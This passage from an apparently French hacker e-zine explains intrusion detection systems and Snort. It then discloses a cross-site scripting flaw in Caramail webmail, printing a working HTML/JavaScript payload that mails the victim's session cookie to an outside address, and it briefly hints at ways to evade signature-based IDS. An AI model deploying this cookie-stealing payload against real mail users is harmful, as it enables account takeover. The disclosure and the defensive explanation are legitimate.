+indispensables pour l'administrateur car ils permettent de sign-
+-aler une anormalité dans les données du système (dans ce cas 
+on utilisera un HIDS, Host based Intrusion Detection System) 
+ou dans le trafic de données,  c'est à dire des paquets tran-
+-sitant d'une machine extérieure à la votre (on parlera alors 
+de NIDS, Network based Intrusion Detection System, un des plus 
+connus et des plus sophistiqués est snort, http://www.snort.org).
+
+D'un point de vue algorythmique, les IDS se basent sur trois 
+grands types d'approches, comportementale, scénaristique, ou 
+holistique. Dans le cas d'une approche comportementale, un pro-
+-fil est établi en fonction des habitudes de l'utilisateur, si 
+il arrive un jour que ce profil soit "contesté", comprennez par 
+là que le profil d'un autre utilisateur ne corresponde pas au 
+profil défini, alors une alerte est immédiatement remontée. Ca 
+peut poser problème, d'une part parce qu'une norme d'utilisation 
+est longue et compliquée à mettre en place, et d'autre part parce 
+que vous pourrez très bien effectuer des commandes jugées anorma-
+-les sans vous en rendre compte, ce qui fausserait le comporte-
+-ment de l'IDS.
+
+L'approche scénaristique, quant à elle, se base sur des scénarios 
+(aussi apellés patterns). Dans ce cas précis l'IDS stocke une 
+série de possibilitées dans une base de données, ainsi si une 
+commande tapée dans un shell correspond a un de ces scénarios 
+entreposés dans la base de données, il y'aura un message d'alerte.
+
+Là encore ce type d'approche présente des problèmes, car elle est 
+(assez) facile à contourner. Par exemple, nous pourrons penser à 
+utiliser une méthode de contournement par insertion en executant 
+une commande en arrière plan (dans le cas d'un HIDS), ou à 
+jouer avec des caractères ascii/unicode pour exploiter sans 
+danger une faille de script kiddie sur un serveur web (dans le 
+cas d'un NIDS).
+
+Enfin, plus récente, l'approche holistique, pas encore tout à 
+fait au point, pourra consister dans un futur proche à prévoir 
+l'objectif du pirate afin de déduire les attaques qui en décou-
+-lent, et ainsi instaurer un plan de défense efficace. Comme 
+je l'ai mentionné plus haut, ce type d'approche n'est pas 
+encore opérationelle et ne verra le jour que dans quelques 
+années.
+
+On devra s'en tenir là pour le moment. Tout à l'heure je vous 
+ais parlé d'un NIDS très utilisé, il s'agit de snort. Snort 
+fonctionne sur l'approche scénaristique, c'est à dire qu'il 
+analyse le trafic IP entrant et essaye de voir si les paquets 
+échangés lors de ce trafic sont bien dans la régularité la plus 
+élémentaire, si ils ne correspondent pas à un des exploits dis-
+-tants connus de snort, à un scan nmap, si ils ne sont pas err-
+-onés, etc... En général snort fait bien son travail et devr-
+-ait vous permettre de repérer aisément une tentative d'intr-
+-usion sur votre système. Et en sécurité réseau, un admini-
+-strateur averti en vaut quatre... Préférez la prévention à 
+la guérison.
+
+
+
+[-EOF]
+
+
+
+
+
+
+
+
+
+---------------------------------------------------------------
+VII.: FAILLE DE CSS SUR CARAMAIL                Par groslameur
+---------------------------------------------------------------
+
+
+Caramail néglige t'il la sécurité de ses (nombreux) utilisa-
+teurs ? Déjà le simple fait que l'envoi de mail passe par un
+formulaire html est, bien hélas, une exposition très dangeur-
+euse à toutes sortes de risques.
+
+Ces risques, ce sont ces failles de cross-site scripting.
+Pour ne pas trop perturber votre esprit indu je ne vous raba-
+-cherais pas la définition de ce terme...
+
+La faille de CSS exposée dans cet article permet tout simple-
+-ment d'infiltrer n'importe quelle boite caramail...
+
+Quid ? En fait cette faille permet d'executer un script en 
+tâche de fond à l'insu de la victime, permettant ainsi de
+récupérer son cookie avec un simple code javascript. Le 
+problème à l'origine de cette faille est tout simplement
+un mauvais filtrage du javascript dans les mails envoyés
+au format html. Ainsi nous pouvons très simplement faire
+executer du code js dans un fichier html, comme ceci:
+
+
+<html><font>">"<"</font><img x=">" src="javascript:a = new Image(); 
+a.src = a.src = 'http://www23.caramail.lycos.fr/cgi-bin/SelectAction?
+dealias=0&mailto=dev@null.com&subject=cookie
+&BODY='+ document.cookie +'&targetaction=none';" </font></html>
+
+
+Le script ci dessus, dès lors qu'il sera ouvert par une 
+victime, enverra son cookie à partir d'une simple url (!) 
+sur la boite dev@null.com.
+
+Pas besoin d'en dire plus, il n'est pas question ici de donner
+une méthode pour permettre à tout le monde de pirater tout le
+monde, mais tout simplement d'exposer le problème (des fois que
+caramail passerait par là ?!).
+
+Pour se défendre contre ce type de problème, n'ouvrez que les
+mails envoyés par une personne en qui vous avez confiance, et,
+au moindre de doute, cochez le message et cliquez sur le bouton
+"Telecharger" pour l'ouvrir sans en executer son éventuel contenu
+html. 
+
+
+
+[-EOF]
+
+
+
+
+
+
+ -------------------------------------------------------------------
+| $ cat commentaires | mail -s #@##@##!!!!! groslameur@caramail.com |
+ -------------------------------------------------------------------
+                       ___ end of file ___ 
